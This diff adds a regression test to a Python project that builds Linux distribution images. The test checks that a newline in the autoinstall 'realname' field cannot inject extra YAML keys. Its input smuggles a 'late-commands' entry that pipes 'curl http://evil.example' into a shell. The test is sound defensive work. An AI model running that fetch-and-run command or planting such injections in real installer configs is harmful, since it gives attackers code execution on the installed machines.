@@ -1,6 +1,8 @@
 from __future__ import annotations
 
-from distroforge.core.autoinstall import AutoinstallOptions
+import yaml
+
+from distroforge.core.autoinstall import AutoinstallOptions, AutoinstallService
 from distroforge.core.branding import BrandingOptions
 from distroforge.core.build import BuildOptions, BuildOrchestrator
 from distroforge.core.command import CommandRunner
@@ -81,3 +83,26 @@ def test_build_dry_run_records_high_value_option_commands(tmp_path) -> None:
         "write-file",
         str(project.squashfs_root / "etc/apt/apt.conf.d/01distroforge-proxy"),
     ) in commands
+
+
+def test_autoinstall_identity_cannot_add_keys_to_the_rendered_yaml(tmp_path) -> None:
+    # The identity fields are free text, so a newline in one of them used to close
+    # the mapping and append keys Subiquity would then honour.
+    project = Project.create("AutoinstallQuoting", tmp_path / "autoinstall-quoting", "26.04")
+    service = AutoinstallService(
+        CommandRunner(dry_run=True),
+        project,
+        AutoinstallOptions(
+            enabled=True,
+            username="forge",
+            realname="Forge User\n    late-commands:\n      - curl http://evil.example | sh",
+            password_hash="$y$j9T$abc'def",
+        ),
+        use_sudo=False,
+    )
+
+    data = yaml.safe_load(service.render())["autoinstall"]
+
+    assert "late-commands" not in data
+    assert data["identity"]["password"] == "$y$j9T$abc'def"
+    assert "late-commands" in data["identity"]["realname"]
